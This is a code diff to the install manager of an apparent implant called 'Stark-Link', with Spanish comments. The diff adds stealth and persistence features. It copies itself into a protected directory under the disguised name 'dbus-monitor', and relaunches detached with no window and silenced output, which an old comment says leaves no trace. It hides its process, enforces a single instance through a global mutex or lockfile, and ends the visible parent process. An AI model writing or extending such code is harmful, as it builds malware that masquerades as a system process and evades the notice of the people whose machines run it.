@@ -82,7 +82,11 @@ class InstallManager(ManagerInterface):
         process_source = self.system.virtual_file_system.query("PROCESS_SOURCE_FILEPATH")
         secure_directory = self.system.virtual_file_system.query("SECURE_DIRECTORY_PATH")
 
+        # ADAPTACIÓN MULTIPLATAFORMA: Agregar .exe si estamos en Windows
         new_process_name = "dbus-monitor"
+        if os.name == 'nt':
+            new_process_name += ".exe"
+
         target_path = os.path.join(secure_directory, new_process_name)
         
         try:
@@ -92,7 +96,7 @@ class InstallManager(ManagerInterface):
             print("[InstallManager] Program file deployed to:", target_path)
 
             # Re-name the new destination file
-            self.system.virtual_file_system.update("PROCESS_SOURCE_FILEPATH", os.path.join(secure_directory, new_process_name))
+            self.system.virtual_file_system.update("PROCESS_SOURCE_FILEPATH", target_path)
             return True
         except:
             traceback.print_exc()
@@ -112,46 +116,111 @@ class InstallManager(ManagerInterface):
             return False
         
         return True
-    
+
     def _respawn_system(self) -> Optional[bool]:
         vfs = self.system.virtual_file_system
         new_executable = vfs.query("PROCESS_SOURCE_FILEPATH")
-
-        print(f"[InstallManager] Handing off execution to: {new_executable}")
         
+        # Preparación de flags y parámetros según OS
+        creation_flags = 0
+        kwargs = {
+            "stdout": subprocess.DEVNULL,
+            "stderr": subprocess.DEVNULL,
+            "stdin": subprocess.DEVNULL,
+            "close_fds": True
+        }
+
+        print(f"[InstallManager] Ejecutando handoff multiplataforma hacia: {new_executable}")
+
+        if os.name == 'nt':
+            # 0x01000000 = CREATE_BREAKAWAY_FROM_JOB
+            # Permite que el proceso sobreviva aunque el padre (terminal) muera.
+            CREATE_BREAKAWAY_FROM_JOB = 0x01000000
+            creation_flags = subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS | CREATE_BREAKAWAY_FROM_JOB
+            kwargs["creationflags"] = creation_flags
+        else:
+            # --- LÓGICA PARA GNU/LINUX ---
+            # start_new_session=True: Crea un nuevo SID (Session ID). 
+            # El proceso se vuelve líder de su propia sesión y se desvincula de la tty.
+            kwargs["start_new_session"] = True
+
         try:
-            # Popen con start_new_session=True para que no muera al cerrar la terminal
-            # Redirigimos streams a DEVNULL para no dejar rastro de salida
+            # Ejecución del proceso hijo
             subprocess.Popen(
                 [new_executable] + sys.argv[1:],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                stdin=subprocess.DEVNULL,
-                start_new_session=True
-                #detach=True if os.name == 'nt' else False # Manejo para Windows en el futuro
+                **kwargs
             )
             
-            # Suicidio limpio del proceso instalador
-            print("[InstallManager] Installation complete. Exiting original process.")
-            sys.exit(0)
+            print("[InstallManager] Proceso hijo liberado. El proceso original se cerrará ahora.")
+            
+            # Usamos os._exit(0) en lugar de sys.exit() para asegurar una terminación 
+            # inmediata del proceso padre sin intentar limpiar manejadores de la terminal.
+            os._exit(0)
             
         except Exception as e:
-            print(f"[InstallManager] Error during respawn: {e}")
+            print(f"[InstallManager] Error crítico durante el respawn: {e}")
             return False
+
+    def _is_already_running(self) -> bool:
+        """Verifica si ya existe una instancia de Stark-Link ejecutándose."""
+        if os.name == 'nt':
+            import ctypes
+            # Creamos un nombre único para el Mutex del proyecto
+            mutex_name = "Global\\StarkLink_Execution_Mutex_v2"
+            self.mutex = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
+            last_error = ctypes.windll.kernel32.GetLastError()
+            
+            # 183 es el código de ERROR_ALREADY_EXISTS
+            if last_error == 183:
+                return True
+            return False
+        else:
+            # Lógica para Linux usando un archivo de bloqueo (lockfile)
+            import fcntl
+            lock_file_path = "/tmp/stark_link.lock"
+            self.lock_file = open(lock_file_path, 'w')
+            try:
+                fcntl.lockf(self.lock_file, fcntl.LOCK_EX | fcntl.LOCK_NB)
+                return False
+            except IOError:
+                return True
 
     # Public methods
     def start(self) -> bool:
-        # Instance properties definition
-        self.module_container.load_modules(package=modules.__package__)
-        print("Loaded modules:")
-        print(self.module_container.modules_table)
+        # 1. EVITAR DUPLICADOS: Si ya hay uno corriendo, suicidio inmediato.
+        if self._is_already_running():
+            print("[Link] Ya existe una instancia activa. Abortando.")
+            os._exit(0)
 
-        # Start the install manager
-        if self.system.virtual_file_system.is_installed():
-            print("[Link] The software is installed")
+        self.module_container.load_modules(package=modules.__package__)
+        
+        is_installed = self.system.virtual_file_system.is_installed()
+        current_path = os.path.abspath(sys.executable)
+        secure_path = self.system.virtual_file_system.query("PROCESS_SOURCE_FILEPATH")
+        
+        # 2. SI YA ESTÁ INSTALADO
+        if is_installed:
+            # Caso A: Ejecución desde ubicación externa -> Migrar y morir
+            if current_path != secure_path:
+                print("[Link] Migrando a ubicación segura...")
+                self._respawn_system()
+                return True # Este proceso muere aquí
+            
+            # Caso B: Está en la ruta correcta pero tiene terminal (ej. doble clic manual)
+            if "--background" not in sys.argv:
+                print("[Link] Ocultando proceso...")
+                self._respawn_system() 
+                return True # Este proceso muere aquí
+            
+            # Caso C: Es la instancia definitiva (en AppData y con flag --background)
+            print("[Link] Instancia operativa en segundo plano.")
+            return False # Retornamos False para que el sistema principal continúe
+
+        # 3. PRIMERA INSTALACIÓN
         else:
-            print("[Link] The software is not installed. Proceeding with the installation...")
+            print("[Link] Iniciando despliegue inicial...")
             self.install()
+            return True # Tras install() se llama a respawn, así que este proceso muere
 
     def stop(self) -> bool:
         pass
